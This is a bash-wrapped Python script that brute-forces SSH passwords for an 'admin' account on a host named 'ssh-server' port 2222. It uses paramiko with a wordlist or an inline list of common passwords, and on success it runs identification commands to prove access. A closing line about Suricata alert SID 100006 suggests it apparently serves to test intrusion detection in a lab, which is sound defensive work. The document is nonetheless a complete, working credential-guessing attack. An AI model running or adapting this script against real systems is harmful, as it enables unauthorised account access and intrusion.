#!/usr/bin/env bash
# Brute Force - SSH brute force using Python paramiko (no hydra dependency)

echo "[*] Brute Force - SSH PoC"
echo "[*] Target: ssh-server:2222"
echo ""

python3 -c "
import paramiko
import time
import sys

HOST = 'ssh-server'
PORT = 2222
USERNAME = 'admin'
WORDLIST = '/app/wordlists/common.txt'

def load_wordlist():
    try:
        with open(WORDLIST) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f'[!] Wordlist not found at {WORDLIST}, using inline list')
        return [
            'password', '123456', 'admin', 'letmein', 'welcome',
            'monkey', 'dragon', 'master', 'qwerty', 'login',
            'admin123', 'abc123', 'password1', 'iloveyou', 'sunshine',
        ]

passwords = load_wordlist()
print(f'[*] Loaded {len(passwords)} passwords')
print(f'[*] Starting SSH brute force against {USERNAME}@{HOST}:{PORT}')
print()

found = False
start = time.time()

for i, pwd in enumerate(passwords, 1):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(HOST, port=PORT, username=USERNAME, password=pwd, timeout=3,
                       look_for_keys=False, allow_agent=False)
        elapsed = time.time() - start
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> SUCCESS!')
        print()
        print(f'[+] SSH Password found: {pwd}')
        print(f'[+] Attempts: {i}')
        print(f'[+] Time: {elapsed:.1f}s')

        # Execute a command to prove access
        stdin, stdout, stderr = client.exec_command('id; hostname; cat /etc/os-release | head -2')
        output = stdout.read().decode()
        print(f'[+] Remote command output:')
        print(output)

        client.close()
        found = True
        break
    except paramiko.AuthenticationException:
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> FAILED')
    except paramiko.ssh_exception.SSHException as e:
        if 'banner' in str(e).lower():
            print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> RETRY (SSH busy)')
            time.sleep(2)
            continue
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}')
    except Exception as e:
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}')
    finally:
        client.close()
    time.sleep(0.5)

if not found:
    elapsed = time.time() - start
    print()
    print(f'[-] Password not found ({len(passwords)} attempts, {elapsed:.1f}s)')

print()
print('[*] Attack complete. Check Suricata alerts for SID 100006.')
"
